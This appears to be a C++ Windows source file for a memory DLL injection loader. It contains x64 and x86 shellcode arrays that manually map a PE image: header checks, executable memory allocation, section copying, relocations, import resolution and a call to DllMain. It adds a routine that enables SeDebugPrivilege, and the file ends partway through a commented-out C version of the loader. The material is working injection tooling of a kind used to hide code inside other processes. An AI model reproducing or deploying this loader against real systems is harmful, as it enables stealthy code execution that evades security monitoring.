#include "pch.h"
#include "loader.h"
#ifndef _WIN64
#include "../src/wow64ext.h"
#pragma comment(lib, "../src/Debug/wow64ext.lib")
#endif

unsigned char shellcodex64[] = {
	0x40, 0x55, 0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8B, 0xEC,
	0x48, 0x83, 0xEC, 0x78, 0x48, 0x8B, 0x41, 0x30, 0x8B, 0x51, 0x08, 0x4C, 0x8B, 0x61, 0x20, 0x4C,
	0x8B, 0x79, 0x28, 0x48, 0x8B, 0x19, 0x4C, 0x8B, 0x69, 0x10, 0x48, 0x8B, 0x71, 0x18, 0x45, 0x33,
	0xF6, 0x48, 0x89, 0x45, 0xC0, 0x48, 0x8B, 0x41, 0x38, 0x4C, 0x89, 0x65, 0xD0, 0x4C, 0x89, 0x7D,
	0x60, 0x45, 0x8B, 0xC6, 0x4C, 0x89, 0x75, 0x48, 0x48, 0x89, 0x45, 0xC8, 0x48, 0x83, 0xFA, 0x40,
	0x0F, 0x86, 0x58, 0x03, 0x00, 0x00, 0xB8, 0x4D, 0x5A, 0x00, 0x00, 0x66, 0x39, 0x03, 0x0F, 0x85,
	0x4A, 0x03, 0x00, 0x00, 0x48, 0x63, 0x7B, 0x3C, 0x48, 0x8D, 0x87, 0x08, 0x01, 0x00, 0x00, 0x48,
	0x3B, 0xD0, 0x0F, 0x82, 0x36, 0x03, 0x00, 0x00, 0x81, 0x3C, 0x1F, 0x50, 0x45, 0x00, 0x00, 0x0F,
	0x85, 0x29, 0x03, 0x00, 0x00, 0xB8, 0x00, 0x20, 0x00, 0x00, 0x66, 0x85, 0x44, 0x1F, 0x16, 0x0F,
	0x84, 0x19, 0x03, 0x00, 0x00, 0xF6, 0x44, 0x1F, 0x16, 0x02, 0x0F, 0x84, 0x0E, 0x03, 0x00, 0x00,
	0xB8, 0xF0, 0x00, 0x00, 0x00, 0x66, 0x39, 0x44, 0x1F, 0x14, 0x0F, 0x85, 0xFE, 0x02, 0x00, 0x00,
	0x44, 0x0F, 0xB7, 0x4C, 0x1F, 0x06, 0x45, 0x8B, 0xD6, 0x45, 0x85, 0xC9, 0x7E, 0x23, 0x48, 0x8D,
	0x8B, 0x18, 0x01, 0x00, 0x00, 0x48, 0x03, 0xCF, 0x8B, 0x41, 0x04, 0x03, 0x01, 0x3B, 0xC2, 0x0F,
	0x87, 0xD9, 0x02, 0x00, 0x00, 0x41, 0xFF, 0xC2, 0x48, 0x83, 0xC1, 0x28, 0x45, 0x3B, 0xD1, 0x7C,
	0xE7, 0x44, 0x8B, 0x54, 0x1F, 0x38, 0x8B, 0x44, 0x1F, 0x54, 0x33, 0xD2, 0xFF, 0xC8, 0x41, 0x03,
	0xC2, 0x41, 0xF7, 0xF2, 0x8B, 0xC8, 0x41, 0x0F, 0xAF, 0xCA, 0x45, 0x85, 0xC9, 0x7E, 0x35, 0x4C,
	0x8D, 0x9B, 0x18, 0x01, 0x00, 0x00, 0x4C, 0x03, 0xDF, 0x41, 0x8B, 0x43, 0xF8, 0x41, 0x39, 0x03,
	0x41, 0x0F, 0x4F, 0x03, 0x33, 0xD2, 0x4D, 0x8D, 0x5B, 0x28, 0xFF, 0xC8, 0x41, 0x03, 0x43, 0xD4,
	0x41, 0x03, 0xC2, 0x41, 0xF7, 0xF2, 0x41, 0x0F, 0xAF, 0xC2, 0x3B, 0xC8, 0x0F, 0x4C, 0xC8, 0x49,
	0xFF, 0xC9, 0x75, 0xD5, 0x85, 0xC9, 0x0F, 0x84, 0x72, 0x02, 0x00, 0x00, 0x48, 0x63, 0xC1, 0x4C,
	0x8D, 0x4D, 0xB8, 0x48, 0x8D, 0x55, 0x48, 0x48, 0x83, 0xC9, 0xFF, 0xC7, 0x44, 0x24, 0x28, 0x40,
	0x00, 0x00, 0x00, 0x48, 0x89, 0x45, 0xB8, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x10, 0x00, 0x00, 0xFF,
	0xD6, 0x4C, 0x8B, 0x45, 0x48, 0x4D, 0x85, 0xC0, 0x0F, 0x84, 0x40, 0x02, 0x00, 0x00, 0x0F, 0xB7,
	0x44, 0x1F, 0x06, 0x49, 0x8B, 0xD6, 0x8D, 0x0C, 0x80, 0x8B, 0x44, 0x1F, 0x54, 0x8D, 0x0C, 0xC8,
	0x4C, 0x63, 0xC9, 0x85, 0xC9, 0x7E, 0x13, 0x8A, 0x04, 0x1A, 0x42, 0x88, 0x04, 0x02, 0x4C, 0x8B,
	0x45, 0x48, 0x48, 0xFF, 0xC2, 0x49, 0x3B, 0xD1, 0x7C, 0xED, 0x45, 0x8B, 0xCE, 0x66, 0x44, 0x3B,
	0x74, 0x1F, 0x06, 0x73, 0x50, 0x48, 0x8D, 0x8B, 0x18, 0x01, 0x00, 0x00, 0x48, 0x03, 0xCF, 0x44,
	0x39, 0x71, 0xFC, 0x74, 0x2F, 0x44, 0x39, 0x31, 0x74, 0x2A, 0x44, 0x8B, 0x51, 0xFC, 0x49, 0x8B,
	0xD6, 0x4D, 0x03, 0xD0, 0x44, 0x39, 0x31, 0x76, 0x1B, 0x8B, 0x41, 0x04, 0x48, 0x03, 0xC2, 0x8A,
	0x04, 0x18, 0x42, 0x88, 0x04, 0x12, 0x8B, 0x01, 0x48, 0xFF, 0xC2, 0x48, 0x3B, 0xD0, 0x72, 0xE9,
	0x4C, 0x8B, 0x45, 0x48, 0x0F, 0xB7, 0x44, 0x1F, 0x06, 0x41, 0xFF, 0xC1, 0x48, 0x83, 0xC1, 0x28,
	0x44, 0x3B, 0xC8, 0x7C, 0xBA, 0x8B, 0x84, 0x1F, 0xB0, 0x00, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x84,
	0x80, 0x00, 0x00, 0x00, 0x44, 0x39, 0xB4, 0x1F, 0xB4, 0x00, 0x00, 0x00, 0x76, 0x76, 0x4D, 0x8B,
	0xD8, 0x49, 0x8D, 0x14, 0x00, 0x4C, 0x2B, 0x5C, 0x1F, 0x30, 0xEB, 0x5D, 0x41, 0x8B, 0xC1, 0x4D,
	0x8B, 0xD6, 0x48, 0x83, 0xE8, 0x08, 0x48, 0xD1, 0xE8, 0x48, 0x63, 0xF0, 0x85, 0xC0, 0x7E, 0x43,
	0x46, 0x0F, 0xB7, 0x4C, 0x52, 0x08, 0xB9, 0x00, 0xF0, 0x00, 0x00, 0x41, 0x0F, 0xB7, 0xC1, 0x66,
	0x23, 0xC1, 0xB9, 0x00, 0x30, 0x00, 0x00, 0x66, 0x3B, 0xC1, 0x74, 0x0A, 0xB9, 0x00, 0xA0, 0x00,
	0x00, 0x66, 0x3B, 0xC1, 0x75, 0x15, 0x8B, 0x0A, 0x41, 0x81, 0xE1, 0xFF, 0x0F, 0x00, 0x00, 0x4B,
	0x8D, 0x04, 0x08, 0x4C, 0x01, 0x1C, 0x01, 0x4C, 0x8B, 0x45, 0x48, 0x49, 0xFF, 0xC2, 0x4C, 0x3B,
	0xD6, 0x7C, 0xBD, 0x8B, 0x42, 0x04, 0x48, 0x03, 0xD0, 0x8B, 0x0A, 0x44, 0x8B, 0x4A, 0x04, 0x41,
	0x03, 0xC9, 0x75, 0x98, 0x8B, 0x84, 0x1F, 0x90, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F, 0x84,
	0x1A, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x70, 0x0C, 0x49, 0x03, 0xF0, 0x44, 0x39, 0x36, 0x0F, 0x84,
	0xED, 0x00, 0x00, 0x00, 0x8B, 0x16, 0x44, 0x8B, 0x76, 0x04, 0x48, 0x83, 0x65, 0x50, 0x00, 0x48,
	0x8D, 0x4D, 0xD8, 0x49, 0x03, 0xD0, 0x4D, 0x03, 0xF0, 0x41, 0xFF, 0xD7, 0x48, 0x8D, 0x55, 0xD8,
	0x48, 0x8D, 0x4D, 0xE8, 0x41, 0xB0, 0x01, 0xFF, 0x55, 0xC0, 0x4C, 0x8D, 0x4D, 0x50, 0x4C, 0x8D,
	0x45, 0xE8, 0x33, 0xD2, 0x33, 0xC9, 0x41, 0xFF, 0xD4, 0x48, 0x8D, 0x4D, 0xE8, 0xFF, 0x55, 0xC8,
	0x48, 0x8B, 0x4D, 0x50, 0x48, 0x85, 0xC9, 0x0F, 0x84, 0xBD, 0x00, 0x00, 0x00, 0x45, 0x33, 0xFF,
	0x4D, 0x39, 0x3E, 0x0F, 0x84, 0x82, 0x00, 0x00, 0x00, 0x49, 0x8B, 0xD6, 0x45, 0x33, 0xE4, 0x48,
	0x8B, 0x02, 0x48, 0x83, 0x65, 0x58, 0x00, 0x49, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x80, 0x49, 0x85, 0xC0, 0x74, 0x14, 0x0F, 0xB7, 0xC0, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x88, 0x00,
	0x00, 0x00, 0x44, 0x0F, 0xB7, 0x02, 0x33, 0xD2, 0xEB, 0x1F, 0x4C, 0x8B, 0x45, 0x48, 0x49, 0x8D,
	0x50, 0x02, 0x48, 0x03, 0xD0, 0x74, 0x77, 0x48, 0x8D, 0x4D, 0xD8, 0xFF, 0x55, 0x60, 0x48, 0x8B,
	0x4D, 0x50, 0x45, 0x33, 0xC0, 0x48, 0x8D, 0x55, 0xD8, 0x4C, 0x8D, 0x4D, 0x58, 0x41, 0xFF, 0xD5,
	0x48, 0x8B, 0x45, 0x58, 0x48, 0x85, 0xC0, 0x74, 0x51, 0x4B, 0x89, 0x04, 0x34, 0x49, 0xFF, 0xC7,
	0x4D, 0x8B, 0xE7, 0x49, 0xC1, 0xE4, 0x03, 0x4B, 0x8D, 0x14, 0x34, 0x48, 0x83, 0x3A, 0x00, 0x74,
	0x06, 0x48, 0x8B, 0x4D, 0x50, 0xEB, 0x88, 0x4C, 0x8B, 0x65, 0xD0, 0x4C, 0x8B, 0x45, 0x48, 0x48,
	0x83, 0xC6, 0x14, 0x83, 0x3E, 0x00, 0x74, 0x09, 0x4C, 0x8B, 0x7D, 0x60, 0xE9, 0x13, 0xFF, 0xFF,
	0xFF, 0x8B, 0x44, 0x1F, 0x28, 0x4C, 0x89, 0x44, 0x1F, 0x30, 0x48, 0x8B, 0x4D, 0x48, 0x45, 0x33,
	0xC0, 0x48, 0x03, 0xC1, 0x41, 0x8D, 0x50, 0x01, 0xFF, 0xD0, 0x4C, 0x8B, 0x45, 0x48, 0x49, 0x8B,
	0xC0, 0x48, 0x83, 0xC4, 0x78, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5F, 0x5E, 0x5B,
	0x5D, 0xC3
};

unsigned char shellcodex32[] = {
	0x55, 0x8B, 0xEC, 0x81, 0xEC, 0xB0, 0x00, 0x00, 0x00, 0x8B, 0x45, 0x08, 0x8B, 0x08, 0x89, 0x4D,
	0xCC, 0x8B, 0x55, 0x08, 0x8B, 0x42, 0x04, 0x89, 0x45, 0xC0, 0x8B, 0x4D, 0x08, 0x8B, 0x51, 0x08,
	0x89, 0x55, 0xA0, 0x8B, 0x45, 0x08, 0x8B, 0x48, 0x0C, 0x89, 0x8D, 0x64, 0xFF, 0xFF, 0xFF, 0x8B,
	0x55, 0x08, 0x8B, 0x42, 0x10, 0x89, 0x85, 0x78, 0xFF, 0xFF, 0xFF, 0x8B, 0x4D, 0x08, 0x8B, 0x51,
	0x14, 0x89, 0x55, 0xA8, 0x8B, 0x45, 0x08, 0x8B, 0x48, 0x18, 0x89, 0x4D, 0x80, 0x8B, 0x55, 0x08,
	0x8B, 0x42, 0x1C, 0x89, 0x85, 0x70, 0xFF, 0xFF, 0xFF, 0xC7, 0x45, 0x98, 0x00, 0x00, 0x00, 0x00,
	0xC7, 0x45, 0xF4, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x45, 0xDC, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x45,
	0xE8, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x45, 0xFC, 0x00, 0x00, 0x00, 0x00, 0x83, 0x7D, 0xC0, 0x40,
	0x0F, 0x86, 0x73, 0x05, 0x00, 0x00, 0x8B, 0x4D, 0xCC, 0x89, 0x4D, 0xC8, 0x8B, 0x55, 0xC8, 0x0F,
	0xB7, 0x02, 0x3D, 0x4D, 0x5A, 0x00, 0x00, 0x74, 0x0A, 0xE9, 0x5B, 0x05, 0x00, 0x00, 0xE9, 0x56,
	0x05, 0x00, 0x00, 0x8B, 0x4D, 0xC8, 0x8B, 0x51, 0x3C, 0x81, 0xC2, 0xF8, 0x00, 0x00, 0x00, 0x39,
	0x55, 0xC0, 0x73, 0x0A, 0xE9, 0x40, 0x05, 0x00, 0x00, 0xE9, 0x3B, 0x05, 0x00, 0x00, 0x8B, 0x45,
	0xC8, 0x8B, 0x4D, 0xCC, 0x03, 0x48, 0x3C, 0x89, 0x4D, 0xF8, 0x8B, 0x55, 0xF8, 0x81, 0x3A, 0x50,
	0x45, 0x00, 0x00, 0x74, 0x0A, 0xE9, 0x1F, 0x05, 0x00, 0x00, 0xE9, 0x1A, 0x05, 0x00, 0x00, 0x8B,
	0x45, 0xF8, 0x0F, 0xB7, 0x48, 0x16, 0x81, 0xE1, 0x00, 0x20, 0x00, 0x00, 0x75, 0x0A, 0xE9, 0x06,
	0x05, 0x00, 0x00, 0xE9, 0x01, 0x05, 0x00, 0x00, 0x8B, 0x55, 0xF8, 0x0F, 0xB7, 0x42, 0x16, 0x83,
	0xE0, 0x02, 0x75, 0x0A, 0xE9, 0xF0, 0x04, 0x00, 0x00, 0xE9, 0xEB, 0x04, 0x00, 0x00, 0x8B, 0x4D,
	0xF8, 0x0F, 0xB7, 0x51, 0x14, 0x81, 0xFA, 0xE0, 0x00, 0x00, 0x00, 0x74, 0x0A, 0xE9, 0xD7, 0x04,
	0x00, 0x00, 0xE9, 0xD2, 0x04, 0x00, 0x00, 0x8B, 0x45, 0xF8, 0x05, 0xF8, 0x00, 0x00, 0x00, 0x89,
	0x45, 0xF0, 0xC7, 0x45, 0xFC, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x09, 0x8B, 0x4D, 0xFC, 0x83, 0xC1,
	0x01, 0x89, 0x4D, 0xFC, 0x8B, 0x55, 0xF8, 0x0F, 0xB7, 0x42, 0x06, 0x39, 0x45, 0xFC, 0x7D, 0x27,
	0x6B, 0x4D, 0xFC, 0x28, 0x6B, 0x55, 0xFC, 0x28, 0x8B, 0x45, 0xF0, 0x8B, 0x4C, 0x08, 0x14, 0x8B,
	0x45, 0xF0, 0x03, 0x4C, 0x10, 0x10, 0x3B, 0x4D, 0xC0, 0x76, 0x0A, 0xE9, 0x89, 0x04, 0x00, 0x00,
	0xE9, 0x84, 0x04, 0x00, 0x00, 0xEB, 0xC4, 0x8B, 0x4D, 0xF8, 0x8B, 0x51, 0x38, 0x89, 0x55, 0xE8,
	0x8B, 0x45, 0xF8, 0x8B, 0x48, 0x54, 0x8B, 0x55, 0xE8, 0x8D, 0x44, 0x11, 0xFF, 0x33, 0xD2, 0xF7,
	0x75, 0xE8, 0x0F, 0xAF, 0x45, 0xE8, 0x89, 0x45, 0xDC, 0xC7, 0x45, 0xFC, 0x00, 0x00, 0x00, 0x00,
	0xEB, 0x09, 0x8B, 0x45, 0xFC, 0x83, 0xC0, 0x01, 0x89, 0x45, 0xFC, 0x8B, 0x4D, 0xF8, 0x0F, 0xB7,
	0x51, 0x06, 0x39, 0x55, 0xFC, 0x7D, 0x69, 0x6B, 0x45, 0xFC, 0x28, 0x8B, 0x4D, 0xF0, 0x8B, 0x54,
	0x01, 0x08, 0x89, 0x55, 0xA4, 0x6B, 0x45, 0xFC, 0x28, 0x8B, 0x4D, 0xF0, 0x8B, 0x54, 0x01, 0x10,
	0x89, 0x55, 0x9C, 0x8B, 0x45, 0x9C, 0x3B, 0x45, 0xA4, 0x7E, 0x08, 0x8B, 0x4D, 0x9C, 0x89, 0x4D,
	0xAC, 0xEB, 0x06, 0x8B, 0x55, 0xA4, 0x89, 0x55, 0xAC, 0x8B, 0x45, 0xAC, 0x89, 0x45, 0x84, 0x6B,
	0x4D, 0xFC, 0x28, 0x8B, 0x55, 0xF0, 0x8B, 0x44, 0x0A, 0x0C, 0x03, 0x45, 0x84, 0x8B, 0x4D, 0xE8,
	0x8D, 0x44, 0x08, 0xFF, 0x33, 0xD2, 0xF7, 0x75, 0xE8, 0x0F, 0xAF, 0x45, 0xE8, 0x89, 0x45, 0xB8,
	0x8B, 0x55, 0xDC, 0x3B, 0x55, 0xB8, 0x7D, 0x06, 0x8B, 0x45, 0xB8, 0x89, 0x45, 0xDC, 0xEB, 0x82,
	0x83, 0x7D, 0xDC, 0x00, 0x75, 0x0A, 0xE9, 0xCE, 0x03, 0x00, 0x00, 0xE9, 0xC9, 0x03, 0x00, 0x00,
	0x8B, 0x4D, 0xDC, 0x89, 0x4D, 0x8C, 0x6A, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x8D, 0x55, 0x8C,
	0x52, 0x6A, 0x00, 0x8D, 0x45, 0xF4, 0x50, 0x6A, 0xFF, 0xFF, 0x95, 0x64, 0xFF, 0xFF, 0xFF, 0x83,
	0x7D, 0xF4, 0x00, 0x0F, 0x84, 0xA0, 0x03, 0x00, 0x00, 0x8B, 0x4D, 0xF8, 0x8B, 0x51, 0x54, 0x89,
	0x55, 0x94, 0x8B, 0x45, 0xF8, 0x0F, 0xB7, 0x48, 0x06, 0x6B, 0xD1, 0x28, 0x89, 0x95, 0x6C, 0xFF,
	0xFF, 0xFF, 0x8B, 0x45, 0x94, 0x03, 0x85, 0x6C, 0xFF, 0xFF, 0xFF, 0x89, 0x85, 0x7C, 0xFF, 0xFF,
	0xFF, 0xC7, 0x45, 0xFC, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x09, 0x8B, 0x4D, 0xFC, 0x83, 0xC1, 0x01,
	0x89, 0x4D, 0xFC, 0x8B, 0x55, 0xFC, 0x3B, 0x95, 0x7C, 0xFF, 0xFF, 0xFF, 0x7D, 0x12, 0x8B, 0x45,
	0xF4, 0x03, 0x45, 0xFC, 0x8B, 0x4D, 0xCC, 0x03, 0x4D, 0xFC, 0x8A, 0x11, 0x88, 0x10, 0xEB, 0xDA,
	0xC7, 0x45, 0xFC, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x09, 0x8B, 0x45, 0xFC, 0x83, 0xC0, 0x01, 0x89,
	0x45, 0xFC, 0x8B, 0x4D, 0xF8, 0x0F, 0xB7, 0x51, 0x06, 0x39, 0x55, 0xFC, 0x7D, 0x7A, 0x6B, 0x45,
	0xFC, 0x28, 0x8B, 0x4D, 0xF0, 0x83, 0x7C, 0x01, 0x0C, 0x00, 0x74, 0x0E, 0x6B, 0x55, 0xFC, 0x28,
	0x8B, 0x45, 0xF0, 0x83, 0x7C, 0x10, 0x10, 0x00, 0x75, 0x02, 0xEB, 0xCD, 0x6B, 0x4D, 0xFC, 0x28,
	0x8B, 0x55, 0xF0, 0x8B, 0x45, 0xF4, 0x03, 0x44, 0x0A, 0x0C, 0x89, 0x85, 0x58, 0xFF, 0xFF, 0xFF,
	0xC7, 0x45, 0xE0, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x09, 0x8B, 0x4D, 0xE0, 0x83, 0xC1, 0x01, 0x89,
	0x4D, 0xE0, 0x6B, 0x55, 0xFC, 0x28, 0x8B, 0x45, 0xF0, 0x8B, 0x4D, 0xE0, 0x3B, 0x4C, 0x10, 0x10,
	0x73, 0x21, 0x6B, 0x55, 0xFC, 0x28, 0x8B, 0x45, 0xF0, 0x8B, 0x4D, 0xCC, 0x03, 0x4C, 0x10, 0x14,
	0x8B, 0x95, 0x58, 0xFF, 0xFF, 0xFF, 0x03, 0x55, 0xE0, 0x8B, 0x45, 0xE0, 0x8A, 0x0C, 0x01, 0x88,
	0x0A, 0xEB, 0xC6, 0xE9, 0x71, 0xFF, 0xFF, 0xFF, 0xBA, 0x08, 0x00, 0x00, 0x00, 0x6B, 0xC2, 0x05,
	0x8B, 0x4D, 0xF8, 0x83, 0x7C, 0x01, 0x78, 0x00, 0x0F, 0x86, 0xE7, 0x00, 0x00, 0x00, 0xBA, 0x08,
	0x00, 0x00, 0x00, 0x6B, 0xC2, 0x05, 0x8B, 0x4D, 0xF8, 0x83, 0x7C, 0x01, 0x7C, 0x00, 0x0F, 0x86,
	0xD1, 0x00, 0x00, 0x00, 0x8B, 0x55, 0xF8, 0x8B, 0x45, 0xF4, 0x2B, 0x42, 0x34, 0x89, 0x45, 0x90,
	0xB9, 0x08, 0x00, 0x00, 0x00, 0x6B, 0xD1, 0x05, 0x8B, 0x45, 0xF8, 0x8B, 0x4D, 0xF4, 0x03, 0x4C,
	0x10, 0x78, 0x89, 0x4D, 0xEC, 0x8B, 0x55, 0xEC, 0x8B, 0x02, 0x8B, 0x4D, 0xEC, 0x03, 0x41, 0x04,
	0x0F, 0x84, 0x9F, 0x00, 0x00, 0x00, 0x8B, 0x55, 0xEC, 0x83, 0xC2, 0x08, 0x89, 0x55, 0xC4, 0x8B,
	0x45, 0xEC, 0x8B, 0x48, 0x04, 0x83, 0xE9, 0x08, 0xD1, 0xE9, 0x89, 0x8D, 0x74, 0xFF, 0xFF, 0xFF,
	0xC7, 0x45, 0xFC, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x09, 0x8B, 0x55, 0xFC, 0x83, 0xC2, 0x01, 0x89,
	0x55, 0xFC, 0x8B, 0x45, 0xFC, 0x3B, 0x85, 0x74, 0xFF, 0xFF, 0xFF, 0x7D, 0x57, 0x8B, 0x4D, 0xFC,
	0x8B, 0x55, 0xC4, 0x0F, 0xB7, 0x04, 0x4A, 0x25, 0x00, 0xF0, 0x00, 0x00, 0x3D, 0x00, 0x30, 0x00,
	0x00, 0x74, 0x16, 0x8B, 0x4D, 0xFC, 0x8B, 0x55, 0xC4, 0x0F, 0xB7, 0x04, 0x4A, 0x25, 0x00, 0xF0,
	0x00, 0x00, 0x3D, 0x00, 0xA0, 0x00, 0x00, 0x75, 0x29, 0x8B, 0x4D, 0xEC, 0x8B, 0x55, 0xF4, 0x03,
	0x11, 0x8B, 0x45, 0xFC, 0x8B, 0x4D, 0xC4, 0x0F, 0xB7, 0x04, 0x41, 0x25, 0xFF, 0x0F, 0x00, 0x00,
	0x03, 0xD0, 0x89, 0x55, 0xB4, 0x8B, 0x4D, 0xB4, 0x8B, 0x11, 0x03, 0x55, 0x90, 0x8B, 0x45, 0xB4,
	0x89, 0x10, 0xEB, 0x95, 0x8B, 0x4D, 0xEC, 0x8B, 0x55, 0xEC, 0x03, 0x51, 0x04, 0x89, 0x55, 0xEC,
	0xE9, 0x50, 0xFF, 0xFF, 0xFF, 0xB8, 0x08, 0x00, 0x00, 0x00, 0xC1, 0xE0, 0x00, 0x8B, 0x4D, 0xF8,
	0x8B, 0x54, 0x01, 0x78, 0x89, 0x55, 0xB0, 0x83, 0x7D, 0xB0, 0x00, 0x75, 0x0A, 0xE9, 0x97, 0x01,
	0x00, 0x00, 0xE9, 0x92, 0x01, 0x00, 0x00, 0x8B, 0x45, 0xF4, 0x03, 0x45, 0xB0, 0x89, 0x45, 0xE4,
	0xC7, 0x45, 0xBC, 0x00, 0x00, 0x00, 0x00, 0x8B, 0x4D, 0xE4, 0x83, 0x79, 0x0C, 0x00, 0x0F, 0x84,
	0x55, 0x01, 0x00, 0x00, 0x8B, 0x55, 0xE4, 0x8B, 0x45, 0xF4, 0x03, 0x42, 0x10, 0x89, 0x85, 0x68,
	0xFF, 0xFF, 0xFF, 0x8B, 0x4D, 0xE4, 0x8B, 0x55, 0xF4, 0x03, 0x51, 0x10, 0x89, 0x55, 0xD8, 0x8B,
	0x45, 0xE4, 0x8B, 0x4D, 0xF4, 0x03, 0x48, 0x0C, 0x89, 0x4D, 0x88, 0xC7, 0x45, 0xD0, 0x00, 0x00,
	0x00, 0x00, 0x8B, 0x55, 0x88, 0x52, 0x8D, 0x85, 0x5C, 0xFF, 0xFF, 0xFF, 0x50, 0xFF, 0x55, 0xA8,
	0x6A, 0x01, 0x8D, 0x8D, 0x5C, 0xFF, 0xFF, 0xFF, 0x51, 0x8D, 0x95, 0x50, 0xFF, 0xFF, 0xFF, 0x52,
	0xFF, 0x55, 0x80, 0x8D, 0x45, 0xD0, 0x50, 0x8D, 0x8D, 0x50, 0xFF, 0xFF, 0xFF, 0x51, 0x6A, 0x00,
	0x6A, 0x00, 0xFF, 0x95, 0x78, 0xFF, 0xFF, 0xFF, 0x8D, 0x95, 0x50, 0xFF, 0xFF, 0xFF, 0x52, 0xFF,
	0x95, 0x70, 0xFF, 0xFF, 0xFF, 0x83, 0x7D, 0xD0, 0x00, 0x75, 0x0A, 0xE9, 0xF9, 0x00, 0x00, 0x00,
	0xE9, 0xF4, 0x00, 0x00, 0x00, 0xC7, 0x45, 0xFC, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x09, 0x8B, 0x45,
	0xFC, 0x83, 0xC0, 0x01, 0x89, 0x45, 0xFC, 0x8B, 0x4D, 0xFC, 0x8B, 0x55, 0xD8, 0x83, 0x3C, 0x8A,
	0x00, 0x75, 0x05, 0xE9, 0xA3, 0x00, 0x00, 0x00, 0xC7, 0x45, 0xD4, 0x00, 0x00, 0x00, 0x00, 0x8B,
	0x45, 0xFC, 0x8B, 0x4D, 0xD8, 0x8B, 0x14, 0x81, 0x81, 0xE2, 0x00, 0x00, 0x00, 0x80, 0x74, 0x2F,
	0x8B, 0x45, 0xFC, 0x8B, 0x4D, 0xD8, 0x8B, 0x14, 0x81, 0x81, 0xE2, 0xFF, 0xFF, 0x00, 0x00, 0x74,
	0x1C, 0x8D, 0x45, 0xD4, 0x50, 0x8B, 0x4D, 0xFC, 0x8B, 0x55, 0xD8, 0x8B, 0x04, 0x8A, 0x25, 0xFF,
	0xFF, 0x00, 0x00, 0x50, 0x6A, 0x00, 0x8B, 0x4D, 0xD0, 0x51, 0xFF, 0x55, 0xA0, 0xEB, 0x3C, 0x8B,
	0x55, 0xFC, 0x8B, 0x45, 0xD8, 0x8B, 0x4D, 0xF4, 0x03, 0x0C, 0x90, 0x89, 0x4D, 0xBC, 0x8B, 0x55,
	0xBC, 0x83, 0xC2, 0x02, 0x74, 0x25, 0x8B, 0x45, 0xBC, 0x83, 0xC0, 0x02, 0x50, 0x8D, 0x8D, 0x5C,
	0xFF, 0xFF, 0xFF, 0x51, 0xFF, 0x55, 0xA8, 0x8D, 0x55, 0xD4, 0x52, 0x6A, 0x00, 0x8D, 0x85, 0x5C,
	0xFF, 0xFF, 0xFF, 0x50, 0x8B, 0x4D, 0xD0, 0x51, 0xFF, 0x55, 0xA0, 0x83, 0x7D, 0xD4, 0x00, 0x74,
	0x11, 0x8B, 0x55, 0xFC, 0x8B, 0x85, 0x68, 0xFF, 0xFF, 0xFF, 0x8B, 0x4D, 0xD4, 0x89, 0x0C, 0x90,
	0xEB, 0x04, 0xEB, 0x35, 0xEB, 0x33, 0xE9, 0x43, 0xFF, 0xFF, 0xFF, 0x8B, 0x55, 0xE4, 0x83, 0xC2,
	0x14, 0x89, 0x55, 0xE4, 0xE9, 0x9E, 0xFE, 0xFF, 0xFF, 0x8B, 0x45, 0xF8, 0x8B, 0x4D, 0xF4, 0x89,
	0x48, 0x34, 0x8B, 0x55, 0xF8, 0x8B, 0x42, 0x28, 0x03, 0x45, 0xF4, 0x89, 0x45, 0x98, 0x6A, 0x00,
	0x6A, 0x01, 0x8B, 0x4D, 0xF4, 0x51, 0xFF, 0x55, 0x98, 0x8B, 0x45, 0xF4, 0x8B, 0xE5, 0x5D, 0xC2,
	0x04, 0x00
};

BOOL EnableDebugPrivilege()
{
	HANDLE hToken;
	BOOL fOk = FALSE;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid))
		{
			return FALSE;
		}
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL))
		{
			return FALSE;
		}
		else
		{
			fOk = TRUE;
		}
		CloseHandle(hToken);
	}
	return fOk;
}

//DWORDX WINAPI MemLoadLibrary2(PARAMX *X)//2502
//{
//
//	LPCVOID lpFileData = X->lpFileData;
//	DWORDX DataLength = X->DataLength;
//
//	/****************初始化调用函数********************/
//	LdrGetProcedureAddressT LdrGetProcedureAddress = (X->LdrGetProcedureAddress);
//
//	NtAllocateVirtualMemoryT pNtAllocateVirtualMemory = (X->dwNtAllocateVirtualMemory);
//	LdrLoadDllT pLdrLoadDll = (X->pLdrLoadDll);
//	RtlInitAnsiStringT RtlInitAnsiString = X->RtlInitAnsiString;
//	RtlAnsiStringToUnicodeStringT RtlAnsiStringToUnicodeString = X->RtlAnsiStringToUnicodeString;
//	RtlFreeUnicodeStringT RtlFreeUnicodeString = X->RtlFreeUnicodeString;
//
//	ProcDllMain pDllMain = NULL;
//	void *pMemoryAddress = NULL;
//
//
//
//	ANSI_STRING ansiStr;
//	UNICODE_STRING UnicodeString;
//	PIMAGE_DOS_HEADER pDosHeader;
//	PIMAGE_NT_HEADERS pNTHeader;
//	PIMAGE_SECTION_HEADER pSectionHeader;
//	int ImageSize = 0;
//
//	int nAlign = 0;
//	int i = 0;
//
//
//	//检查数据有效性，并初始化
//	/*********************CheckDataValide**************************************/
//	//	PIMAGE_DOS_HEADER pDosHeader;
//	//检查长度
//	if (DataLength > sizeof(IMAGE_DOS_HEADER))
//	{
